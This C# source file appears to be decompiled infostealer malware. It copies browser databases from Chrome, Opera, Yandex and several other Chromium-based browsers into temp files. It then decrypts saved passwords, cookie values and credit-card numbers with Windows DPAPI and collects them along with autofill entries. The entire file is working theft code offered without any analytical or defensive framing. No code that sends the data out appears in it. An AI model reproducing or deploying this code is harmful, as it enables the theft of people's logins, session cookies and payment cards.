namespace NoFile
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;

    internal class Browsers
    {
        [DllImport("crypt32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);
        public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
        {
            DataBlob pPlainText = new DataBlob();
            DataBlob pCipherText = new DataBlob();
            DataBlob pEntropy = new DataBlob();
            CryptprotectPromptstruct pPrompt = new CryptprotectPromptstruct {
                cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = null
            };
            string pszDescription = string.Empty;
            try
            {
                try
                {
                    if (cipherTextBytes == null)
                    {
                        cipherTextBytes = new byte[0];
                    }
                    pCipherText.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
                    pCipherText.cbData = cipherTextBytes.Length;
                    Marshal.Copy(cipherTextBytes, 0, pCipherText.pbData, cipherTextBytes.Length);
                }
                catch (Exception)
                {
                }
                try
                {
                    if (entropyBytes == null)
                    {
                        entropyBytes = new byte[0];
                    }
                    pEntropy.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
                    pEntropy.cbData = entropyBytes.Length;
                    Marshal.Copy(entropyBytes, 0, pEntropy.pbData, entropyBytes.Length);
                }
                catch (Exception)
                {
                }
                CryptUnprotectData(ref pCipherText, ref pszDescription, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);
                byte[] destination = new byte[pPlainText.cbData];
                Marshal.Copy(pPlainText.pbData, destination, 0, pPlainText.cbData);
                return destination;
            }
            catch (Exception)
            {
            }
            finally
            {
                if (pPlainText.pbData != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(pPlainText.pbData);
                }
                if (pCipherText.pbData != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(pCipherText.pbData);
                }
                if (pEntropy.pbData != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(pEntropy.pbData);
                }
            }
            return new byte[0];
        }

        private static List<CardData> FetchCards(string basePath)
        {
            if (!File.Exists(basePath))
            {
                return null;
            }
            basePath.Contains("Chrome");
            basePath.Contains("Yandex");
            basePath.Contains("Orbitum");
            basePath.Contains("Opera");
            basePath.Contains("Amigo");
            basePath.Contains("Torch");
            basePath.Contains("Comodo");
            try
            {
                string path = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
                if (File.Exists(path))
                {
                    File.Delete(path);
                }
                File.Copy(basePath, path, true);
                SqlHandler handler = new SqlHandler(path);
                List<CardData> list = new List<CardData>();
                handler.ReadTable("credit_cards");
                int rowNum = 0;
                while (true)
                {
                    if (rowNum >= handler.GetRowCount())
                    {
                        break;
                    }
                    try
                    {
                        string str2 = string.Empty;
                        try
                        {
                            str2 = Encoding.UTF8.GetString(DecryptBrowsers(Encoding.Default.GetBytes(handler.GetValue(rowNum, 4)), null));
                        }
                        catch (Exception)
                        {
                        }
                        if (str2 != "")
                        {
                            CardData item = new CardData {
                                Name = handler.GetValue(rowNum, 1),
                                Exp_m = handler.GetValue(rowNum, 2),
                                Exp_y = handler.GetValue(rowNum, 3),
                                Number = str2,
                                Billing = handler.GetValue(rowNum, 9)
                            };
                            list.Add(item);
                        }
                    }
                    catch (Exception)
                    {
                    }
                    rowNum++;
                }
                File.Delete(path);
                return list;
            }
            catch (Exception)
            {
                return null;
            }
        }

        private static List<CookieData> FetchCookies(string basePath)
        {
            if (!File.Exists(basePath))
            {
                return null;
            }
            basePath.Contains("Chrome");
            basePath.Contains("Yandex");
            basePath.Contains("Orbitum");
            basePath.Contains("Opera");
            basePath.Contains("Amigo");
            basePath.Contains("Torch");
            basePath.Contains("Comodo");
            try
            {
                string path = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
                if (File.Exists(path))
                {
                    File.Delete(path);
                }
                File.Copy(basePath, path, true);
                SqlHandler handler = new SqlHandler(path);
                List<CookieData> list = new List<CookieData>();
                handler.ReadTable("cookies");
                int rowNum = 0;
                while (true)
                {
                    if (rowNum >= handler.GetRowCount())
                    {
                        break;
                    }
                    try
                    {
                        string str2 = string.Empty;
                        try
                        {
                            str2 = Encoding.UTF8.GetString(DecryptBrowsers(Encoding.Default.GetBytes(handler.GetValue(rowNum, 12)), null));
                        }
                        catch (Exception)
                        {
                        }
                        if (str2 != "")
                        {
                            CookieData item = new CookieData {
                                host_key = handler.GetValue(rowNum, 1),
                                name = handler.GetValue(rowNum, 2),
                                path = handler.GetValue(rowNum, 4),
                                expires_utc = handler.GetValue(rowNum, 5),
                                secure = handler.GetValue(rowNum, 6),
                                value = str2
                            };
                            list.Add(item);
                        }
                    }
                    catch (Exception)
                    {
                    }
                    rowNum++;
                }
                File.Delete(path);
                return list;
            }
            catch (Exception)
            {
                return null;
            }
        }

        private static List<FormData> FetchForms(string basePath)
        {
            if (!File.Exists(basePath))
            {
                return null;
            }
            basePath.Contains("Chrome");
            basePath.Contains("Yandex");
            basePath.Contains("Orbitum");
            basePath.Contains("Opera");
            basePath.Contains("Amigo");
            basePath.Contains("Torch");
            basePath.Contains("Comodo");
            try
            {
                string path = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
                if (File.Exists(path))
                {
                    File.Delete(path);
                }
                File.Copy(basePath, path, true);
                SqlHandler handler = new SqlHandler(path);
                List<FormData> list = new List<FormData>();
                handler.ReadTable("autofill");
                if (handler.GetRowCount() == 0x10000)
                {
                    return null;
                }
                int rowNum = 0;
                while (true)
                {
                    if (rowNum >= handler.GetRowCount())
                    {
                        break;
                    }
                    try
                    {
                        FormData item = new FormData {
                            Name = handler.GetValue(rowNum, 0),
                            Value = handler.GetValue(rowNum, 1)
                        };
                        list.Add(item);
                    }
                    catch (Exception)
                    {
                    }
                    rowNum++;
                }
                File.Delete(path);
                return list;
            }
            catch (Exception)
            {
                return null;
            }
        }

        private static List<PassData> FetchPasswords(string basePath)
        {
            if (!File.Exists(basePath))
            {
                return null;
            }
            string str = "";
            if (basePath.Contains("Chrome"))
            {
                str = "Google Chrome";
            }
            if (basePath.Contains("Yandex"))
            {
                str = "Yandex Browser";
            }
            if (basePath.Contains("Orbitum"))
            {
                str = "Orbitum Browser";
            }
            if (basePath.Contains("Opera"))
            {
                str = "Opera Browser";
            }
            if (basePath.Contains("Amigo"))
            {
                str = "Amigo Browser";
            }
            if (basePath.Contains("Torch"))
            {
                str = "Torch Browser";
            }
            if (basePath.Contains("Comodo"))
            {
                str = "Comodo Browser";
            }
            try
            {
                string path = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
                if (File.Exists(path))
                {
                    File.Delete(path);
                }
                File.Copy(basePath, path, true);
                SqlHandler handler = new SqlHandler(path);
                List<PassData> list = new List<PassData>();
                handler.ReadTable("logins");
                int rowNum = 0;
                while (true)
                {
                    if (rowNum >= handler.GetRowCount())
                    {
                        break;
                    }
                    try
                    {
                        string str3 = string.Empty;
                        try
                        {
                            str3 = Encoding.UTF8.GetString(DecryptBrowsers(Encoding.Default.GetBytes(handler.GetValue(rowNum, 5)), null));
                        }
                        catch (Exception)
                        {
                        }
                        if (str3 != "")
                        {
                            PassData item = new PassData {
                                Url = handler.GetValue(rowNum, 1).Replace("https://", "").Replace("http://", ""),
                                Login = handler.GetValue(rowNum, 3),
                                Password = str3,
                                Program = str
                            };
                            list.Add(item);
                        }
                    }
                    catch (Exception)
                    {
                    }
                    rowNum++;
                }
                File.Delete(path);
                return list;
            }
            catch (Exception)
            {
                return null;
            }
        }

        public static List<CardData> GetCards()
        {
            List<CardData> list = new List<CardData>();
            string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
            string[] strArray = new string[] { environmentVariable + @"\Google\Chrome\User Data\Default\Web Data", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera Stable\Login Data", environmentVariable + @"\Kometa\User Data\Default\Web Data", environmentVariable + @"\Orbitum\User Data\Default\Web Data", environmentVariable + @"\Comodo\Dragon\User Data\Default\Web Data", environmentVariable + @"\Amigo\User\User Data\Default\Web Data", environmentVariable + @"\Torch\User Data\Default\Web Data" };
            for (int i = 0; i < strArray.Length; i++)
            {
                List<CardData> collection = FetchCards(strArray[i]);
                if (collection != null)
                {
                    list.AddRange(collection);
                }
            }
            return list;
        }

        public static List<CookieData> GetCookies()
        {
            List<CookieData> list = new List<CookieData>();
            string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
            string[] strArray = new string[] { environmentVariable + @"\Google\Chrome\User Data\Default\Cookies", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera Stable\Cookies", environmentVariable + @"\Kometa\User Data\Default\Cookies", environmentVariable + @"\Orbitum\User Data\Default\Cookies", environmentVariable + @"\Comodo\Dragon\User Data\Default\Cookies", environmentVariable + @"\Amigo\User\User Data\Default\Cookies", environmentVariable + @"\Torch\User Data\Default\Cookies" };
            for (int i = 0; i < strArray.Length; i++)
            {
                List<CookieData> collection = FetchCookies(strArray[i]);
                if (collection != null)
                {
                    list.AddRange(collection);
                }
            }
            return list;
        }

        public static List<FormData> GetForms()
        {
            List<FormData> list = new List<FormData>();
            string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
            string[] strArray = new string[] { environmentVariable + @"\Google\Chrome\User Data\Default\Web Data", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera Stable\Login Data", environmentVariable + @"\Kometa\User Data\Default\Web Data", environmentVariable + @"\Orbitum\User Data\Default\Web Data", environmentVariable + @"\Comodo\Dragon\User Data\Default\Web Data", environmentVariable + @"\Amigo\User\User Data\Default\Web Data", environmentVariable + @"\Torch\User Data\Default\Web Data" };
            for (int i = 0; i < strArray.Length; i++)
            {
                List<FormData> collection = FetchForms(strArray[i]);
                if (collection != null)
                {
                    list.AddRange(collection);
                }
            }
            return list;
        }

        public static List<PassData> GetPasswords()
        {
            List<PassData> list = new List<PassData>();
            string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
            string[] strArray = new string[] { environmentVariable + @"\Google\Chrome\User Data\Default\Login Data", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera Stable\Login Data", environmentVariable + @"\Kometa\User Data\Default\Login Data", environmentVariable + @"\Orbitum\User Data\Default\Login Data", environmentVariable + @"\Comodo\Dragon\User Data\Default\Login Data", environmentVariable + @"\Amigo\User\User Data\Default\Login Data", environmentVariable + @"\Torch\User Data\Default\Login Data" };
            for (int i = 0; i < strArray.Length; i++)
            {
                List<PassData> collection = FetchPasswords(strArray[i]);
                if (collection != null)
                {
                    list.AddRange(collection);
                }
            }
            return list;
        }

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        private struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        private struct DataBlob
        {
            public int cbData;
            public IntPtr pbData;
        }
    }
}

